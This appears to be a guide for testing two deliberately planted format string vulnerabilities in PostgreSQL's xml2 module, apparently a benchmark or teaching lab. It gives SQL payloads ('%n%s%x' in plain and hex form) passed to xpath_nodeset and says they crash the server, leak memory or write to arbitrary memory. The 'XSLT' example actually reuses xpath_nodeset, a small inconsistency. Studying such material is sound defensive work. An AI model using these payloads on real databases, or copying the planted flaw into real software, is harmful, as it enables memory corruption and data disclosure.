# CWE-134 Format String Vulnerability Examples in PostgreSQL xml2 Module

This document explains how to test the two format string vulnerability examples implemented in the PostgreSQL xml2 module.

## Building and Running the Environment

### 1. Build the Docker Image

First, build the Docker image from the Dockerfile:

```bash
# Navigate to the postgres directory
cd postgres

# Build the Docker image
docker build -t postgres-cwe134 .
```

### 2. Run the Docker Container

Run the container with PostgreSQL port exposed:

```bash
docker run -it --name postgres-cwe134 -p 5432:5432 postgres-cwe134
```

### 3. Compile the xml2 Module

Inside the container, compile and install the xml2 module:

```bash
# Navigate to the xml2 module directory
cd /postgres/contrib/xml2

# Compile the module
make

# Install the module
make install
```

### 4. Verify Installation

Connect to PostgreSQL and verify the xml2 extension:

```sql
psql -d postgres
CREATE EXTENSION xml2;
```

## Prerequisites

1. PostgreSQL with xml2 extension installed
2. Basic understanding of SQL and XML
3. Access to a PostgreSQL database

## Example 1: XML Path Traversal Exploit

This example demonstrates a format string vulnerability through XML path traversal. The vulnerability is triggered when user input is passed directly to a format string function.

### Test Steps

1. Connect to your PostgreSQL database:
```sql
psql -d your_database
```

2. Create the xml2 extension if not already created:
```sql
CREATE EXTENSION xml2;
```

3. Test the vulnerability using the xpath_nodeset function:
```sql
SELECT xpath_nodeset(
    '<root>test</root>',
    '%n%s%x',  -- format string injection
    'tag',
    'sep'
);
```

The format string `%n%s%x` will:
- `%n`: Write the number of characters written so far to a memory location
- `%s`: Read a string from the stack
- `%x`: Print a hexadecimal value from the stack

### Expected Behavior

The function will attempt to process the format string and may:
1. Crash the PostgreSQL process
2. Leak memory contents
3. Write to arbitrary memory locations

## Example 2: XSLT Transformation Exploit

This example demonstrates a format string vulnerability through XSLT transformation. The vulnerability occurs when binary data is processed and passed to a format string function.

### Test Steps

1. Connect to your PostgreSQL database:
```sql
psql -d your_database
```

2. Test the vulnerability using the xpath_nodeset function with binary data:
```sql
SELECT xpath_nodeset(
    '<root>test</root>',
    E'\\x25\\x6E\\x25\\x73\\x25\\x78',  -- format string injection in hex
    'tag',
    'sep'
);
```

The hex-encoded format string `\x25\x6E\x25\x73\x25\x78` decodes to `%n%s%x` and will:
- `%n`: Write the number of characters written so far
- `%s`: Read a string from the stack
- `%x`: Print a hexadecimal value

### Expected Behavior

The function will:
1. Process the binary data through 20 transformation phases
2. Attempt to use the resulting string as a format string
3. May crash or leak memory contents

## Security Implications

These examples demonstrate:
1. Unsafe handling of user input in format strings
2. Lack of input validation
3. Potential for memory corruption
4. Information disclosure risks

## Mitigation

To prevent these vulnerabilities:
1. Always validate and sanitize user input
2. Use format string functions with proper format specifiers
3. Implement proper input validation for XML and XSLT processing
4. Use parameterized queries instead of direct string concatenation

## Note

These examples are for educational purposes only. Do not use them in production environments. 